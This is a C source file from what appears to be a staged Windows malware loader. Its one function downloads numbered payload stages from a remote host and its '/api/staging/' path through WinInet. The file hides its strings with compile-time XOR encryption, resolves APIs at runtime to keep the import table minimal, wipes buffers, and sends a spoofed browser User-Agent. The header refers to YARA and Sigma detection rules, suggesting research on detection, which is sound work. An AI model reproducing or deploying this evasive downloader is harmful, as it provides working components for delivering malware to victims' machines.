/*
 * HTTP fetch — Windows.
 *
 * Calls WinInet through the runtime-resolved g_api table. All URL and
 * User-Agent literals are compile-time XOR-encrypted and decrypted into
 * stack buffers before use, then wiped.
 *
 * Detection artifact: see detection/yara/stage1_peb_walk.yar and
 * detection/sigma/stage1_minimal_iat.yml.
 */

#ifdef _WIN32

#include "http.h"
#include "api_table.h"
#include "xor_string.h"

#include <windows.h>
#include <wininet.h>

#define MAX_RESPONSE (10 * 1024 * 1024)
#define RECV_CHUNK   4096
#define INITIAL_CAP  65536

/* "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" */
static volatile const unsigned char k_ua_enc[] = {
    XE('M', 0),  XE('o', 1),  XE('z', 2),  XE('i', 3),
    XE('l', 4),  XE('l', 5),  XE('a', 6),  XE('/', 7),
    XE('5', 8),  XE('.', 9),  XE('0',10),  XE(' ',11),
    XE('(',12),  XE('W',13),  XE('i',14),  XE('n',15),
    XE('d',16),  XE('o',17),  XE('w',18),  XE('s',19),
    XE(' ',20),  XE('N',21),  XE('T',22),  XE(' ',23),
    XE('1',24),  XE('0',25),  XE('.',26),  XE('0',27),
    XE(';',28),  XE(' ',29),  XE('W',30),  XE('i',31),
    XE('n',32),  XE('6',33),  XE('4',34),  XE(';',35),
    XE(' ',36),  XE('x',37),  XE('6',38),  XE('4',39),
    XE(')',40),  XE( 0 ,41)
};

/* "http://" */
static volatile const unsigned char k_scheme_enc[] = {
    XE('h',0), XE('t',1), XE('t',2), XE('p',3),
    XE(':',4), XE('/',5), XE('/',6), XE( 0 ,7)
};

/* "/api/staging/" */
static volatile const unsigned char k_path_enc[] = {
    XE('/', 0), XE('a', 1), XE('p', 2), XE('i', 3),
    XE('/', 4), XE('s', 5), XE('t', 6), XE('a', 7),
    XE('g', 8), XE('i', 9), XE('n',10), XE('g',11),
    XE('/',12), XE( 0 ,13)
};

static size_t x_strlen(const char *s) {
    const char *p = s;
    while (*p) p++;
    return (size_t)(p - s);
}

static void x_memcpy(void *dst, const void *src, size_t n) {
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    for (size_t i = 0; i < n; i++) d[i] = s[i];
}

/* u32 -> decimal ASCII. Returns chars written (no NUL). */
static size_t x_u32_to_dec(uint32_t v, char *out) {
    char tmp[12];
    size_t n = 0;
    if (v == 0) { out[0] = '0'; return 1; }
    while (v > 0) { tmp[n++] = (char)('0' + v % 10); v /= 10; }
    for (size_t i = 0; i < n; i++) out[i] = tmp[n - 1 - i];
    return n;
}

int http_fetch_stage(const char *host, uint16_t port, int stage,
                     uint8_t **out_buf, size_t *out_len)
{
    *out_buf = NULL;
    *out_len = 0;

    if (!g_api.InternetOpenA || !g_api.InternetOpenUrlA ||
        !g_api.InternetReadFile || !g_api.InternetCloseHandle ||
        !g_api.VirtualAlloc || !g_api.VirtualFree) {
        return HTTP_ERR_INIT;
    }

    /* --- assemble URL on stack ---------------------------------------- */
    char url[512];
    size_t off = 0;
    char scheme[sizeof(k_scheme_enc)];
    char path[sizeof(k_path_enc)];
    xs_decode(k_scheme_enc, scheme, sizeof(k_scheme_enc));
    xs_decode(k_path_enc,   path,   sizeof(k_path_enc));

    size_t scheme_len = sizeof(k_scheme_enc) - 1;
    x_memcpy(url + off, scheme, scheme_len); off += scheme_len;

    size_t hlen = x_strlen(host);
    if (hlen + off + 32 >= sizeof(url)) {
        xs_wipe(scheme, sizeof(scheme));
        xs_wipe(path, sizeof(path));
        return HTTP_ERR_INIT;
    }
    x_memcpy(url + off, host, hlen); off += hlen;

    url[off++] = ':';
    off += x_u32_to_dec((uint32_t)port, url + off);

    size_t path_len = sizeof(k_path_enc) - 1;
    x_memcpy(url + off, path, path_len); off += path_len;
    off += x_u32_to_dec((uint32_t)stage, url + off);
    url[off] = 0;

    xs_wipe(scheme, sizeof(scheme));
    xs_wipe(path,   sizeof(path));

    /* --- InternetOpenA with decrypted UA ------------------------------ */
    char ua[sizeof(k_ua_enc)];
    xs_decode(k_ua_enc, ua, sizeof(k_ua_enc));

    HINTERNET hInet = g_api.InternetOpenA(
        ua, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    xs_wipe(ua, sizeof(ua));
    if (!hInet) {
        xs_wipe(url, sizeof(url));
        return HTTP_ERR_INIT;
    }

    HINTERNET hUrl = g_api.InternetOpenUrlA(
        hInet, url, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    xs_wipe(url, sizeof(url));
    if (!hUrl) {
        g_api.InternetCloseHandle(hInet);
        return HTTP_ERR_CONN;
    }

    /* --- receive into VirtualAlloc'd buffer --------------------------- */
    size_t cap = INITIAL_CAP;
    uint8_t *buf = (uint8_t *)g_api.VirtualAlloc(
        NULL, cap, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) {
        g_api.InternetCloseHandle(hUrl);
        g_api.InternetCloseHandle(hInet);
        return HTTP_ERR_MEM;
    }

    size_t total = 0;
    for (;;) {
        if (total + RECV_CHUNK > cap) {
            if (cap * 2 > MAX_RESPONSE) {
                g_api.VirtualFree(buf, 0, MEM_RELEASE);
                g_api.InternetCloseHandle(hUrl);
                g_api.InternetCloseHandle(hInet);
                return HTTP_ERR_MEM;
            }
            size_t new_cap = cap * 2;
            uint8_t *new_buf = (uint8_t *)g_api.VirtualAlloc(
                NULL, new_cap, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!new_buf) {
                g_api.VirtualFree(buf, 0, MEM_RELEASE);
                g_api.InternetCloseHandle(hUrl);
                g_api.InternetCloseHandle(hInet);
                return HTTP_ERR_MEM;
            }
            x_memcpy(new_buf, buf, total);
            g_api.VirtualFree(buf, 0, MEM_RELEASE);
            buf = new_buf;
            cap = new_cap;
        }
        DWORD got = 0;
        BOOL ok = g_api.InternetReadFile(hUrl, buf + total, RECV_CHUNK, &got);
        if (!ok) {
            g_api.VirtualFree(buf, 0, MEM_RELEASE);
            g_api.InternetCloseHandle(hUrl);
            g_api.InternetCloseHandle(hInet);
            return HTTP_ERR_RECV;
        }
        if (got == 0) break;
        total += got;
    }

    g_api.InternetCloseHandle(hUrl);
    g_api.InternetCloseHandle(hInet);

    *out_buf = buf;
    *out_len = total;
    return HTTP_OK;
}

#endif /* _WIN32 */
